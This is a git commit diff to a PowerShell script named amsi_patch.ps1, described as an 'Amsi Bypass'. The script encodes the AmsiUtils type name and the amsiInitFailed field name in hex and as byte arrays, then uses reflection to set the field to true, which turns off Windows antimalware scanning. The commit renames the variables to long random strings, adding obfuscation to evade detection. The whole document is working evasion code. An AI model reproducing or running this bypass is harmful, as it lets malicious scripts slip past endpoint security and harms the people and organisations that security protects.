024a71e66706509b16466584915b41de6d762e6e
CHA1NSK1 <96607632+Chainski@users.noreply.github.com>
2024-05-18 15:37:20 -0500

    Update amsi_patch.ps1

--- amsi_patch.ps1
+++ amsi_patch.ps1
@@ -1,7 +1,7 @@
 # https://github.com/Chainski/AES-Encoder | Amsi Bypass
-$a1 = (-join ([regex]::Matches("53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73", '..') | ForEach-Object { [char]([convert]::ToUInt32($_.Value, 16)) }))
-$a2 = [Text.Encoding]::UTF8.GetString((0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64))
+$ph5QZJmzF7SgZtFHqv5zDd9zawJFa9pnJRTiecvHoXJEN3YK74 = (-join ([regex]::Matches("53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73", '..') | ForEach-Object { [char]([convert]::ToUInt32($_.Value, 16)) }))
+$r9kSTo4wARdWCKkXKAbeeLTuxsuUhJRMZDny9rAHaxuCnxsmat = [Text.Encoding]::UTF8.GetString((0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64))
 $assembly = [Ref].Assembly
-$type = $assembly.GetType($a1)
-$field = $type.GetField($a2, 'NonPublic, Static')
+$type = $assembly.GetType($ph5QZJmzF7SgZtFHqv5zDd9zawJFa9pnJRTiecvHoXJEN3YK74)
+$field = $type.GetField($r9kSTo4wARdWCKkXKAbeeLTuxsuUhJRMZDny9rAHaxuCnxsmat, 'NonPublic, Static')
 $field.SetValue($null, $true)
